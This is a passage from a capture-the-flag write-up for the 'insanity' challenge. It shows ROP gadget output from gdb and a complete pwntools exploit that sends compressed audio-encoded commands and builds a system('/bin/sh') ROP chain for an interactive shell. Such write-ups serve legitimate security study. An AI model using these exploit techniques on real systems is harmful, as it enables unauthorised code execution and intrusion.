0x00007f8485cdb039 : (b'5fc3')	pop rdi; ret
0x00007f8485d0503e : (b'5fc3')	pop rdi; ret
0x00007f8485cf283f : (b'5fc3')	pop rdi; ret
0x00007f8485cb8046 : (b'5fc3')	pop rdi; ret
0x00007f8485bf0848 : (b'5fc3')	pop rdi; ret
0x00007f8485bf2049 : (b'5fc3')	pop rdi; ret
0x00007f8485c9804b : (b'5fc3')	pop rdi; ret
0x00007f8485cfc962 : (b'5fc3')	pop rdi; ret
0x00007f8485cac852 : (b'5fc3')	pop rdi; ret
0x00007f8485cfc856 : (b'5fc3')	pop rdi; ret
0x00007f8485bf685c : (b'5fc3')	pop rdi; ret
--More--(25/884)q 
gdb-peda$ p/x 0x00007f8485cac800 - 0x7f8485bce000
$1 = 0xde800
gdb-peda$ c
```

## **Exploit Code**

* socat tcp-listen:9001,reuseaddr,fork,bind=0.0.0.0 exec:./insanity

```python title="Exploit Code - ROPExploit.py"
import os
import zlib
from pwn import *

BINARY_PATH = './insanity'
LIBC_PATH = '/lib/x86_64-linux-gnu/libc-2.23.so'

binary = ELF(BINARY_PATH)
libc = ELF(LIBC_PATH)

HOST = "127.0.0.1"
PORT = 9001

gAudio = []
gCmds = []
gCode = []
gPOC = []
pocCode = ''

offRet = 0x20830
offSystem = libc.symbols['system']
offBinsh = 0x18c177
offPOPrdi = 0xde800

def converter(filePath):
    datas = 0
    audioData = []

    with open(filePath) as f:
        while True:
            lBit8 = f.read(1)
            if not lBit8: 
                break
            
            hBit8 = f.read(1)
            if not hBit8:
                break
            hBit8_hex = ord(hBit8)

            audioData.append(chr(hBit8_hex^0x80))
            datas+=1

    log.info("File name : " + filePath + " " + str(hex(datas)))
    
    return ''.join(audioData)

def loadVoiceFile():
    for i in range(0,8):
        gAudio.append(converter('./Voices/insanity-16-'+str(i+1)+'.wav'))
        
def sendMSG(msg):
    data = zlib.compress(msg)
    p.send(p32(len(data)))
    p.send(data)

def createCode(val):
    Cmds = []
    Data = []
    tmp = 0

    while(val):
        tmp = val % 2
        if(tmp == 0):
            val = val / 2
            Cmds.append(4)
            Data.append(2)
        elif(tmp == 1):
            val = val - 1
            Cmds.append(2)
            Data.append(1)

    Cmds.append(4)

    Cmds.reverse()

    Cmds.append(8)
       
    gCode.extend(Cmds)
    gCode.extend(Data)
    log.info("Program code : " + str(gCode))
 
p = remote(HOST, PORT)

loadVoiceFile()

createCode(17362)
for i in gCode:
    sendMSG(gAudio[i-1])

#system()
gPOC.append(33779 + 10)
gPOC.append(6)
gPOC.append(0)
gPOC.append(offSystem - offRet + 10)
gPOC.append(2)
gPOC.append(33781 + 10)
gPOC.append(7)

#"/bin/sh"
gPOC.append(33779 + 10)
gPOC.append(6)
gPOC.append(0)
gPOC.append(offBinsh - offRet + 10)
gPOC.append(2)
gPOC.append(33780 + 10)
gPOC.append(7)

#POP RDI;
gPOC.append(33779 + 10)
gPOC.append(6)
gPOC.append(0)
gPOC.append(offPOPrdi - offRet + 10)
gPOC.append(2)
gPOC.append(33779 + 10)
gPOC.append(7)

gPOC.append(0)

log.info("Fake Code : " + str(gPOC))

for i in gPOC:
    pocCode += p64(i)

pocCode += gAudio[0]

sendMSG(pocCode)

p.send(p32(0))
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: It's chickens all the way down |

## **Related Site**

* <https://kitctf.de/writeups/defconquals17/insanity>
* <https://github.com/kitctf/writeups/blob/master/defconquals2017/insanity/pwn.py>
* <http://www.zlib.net/manual.html>
* <https://cmusphinx.github.io/doc/sphinxbase/>
* <http://www.speech.cs.cmu.edu/sphinx/doc/doxygen/pocketsphinx/pocketsphinx_8h.html>
* <https://askubuntu.com/questions/501910/how-to-text-to-speech-output-using-command-line>
* <https://msdn.microsoft.com/en-us/library/t5h7783k(v=vs.90).aspx>
* <https://msdn.microsoft.com/ko-kr/library/xf7k860c(v=vs.100).aspx>
* <https://msdn.microsoft.com/en-us/library/ba08y07y(v=vs.90).aspx>
* <https://msdn.microsoft.com/en-us/library/bb531393(v=vs.120).aspx>
* <https://pypi.python.org/pypi/pocketsphinx>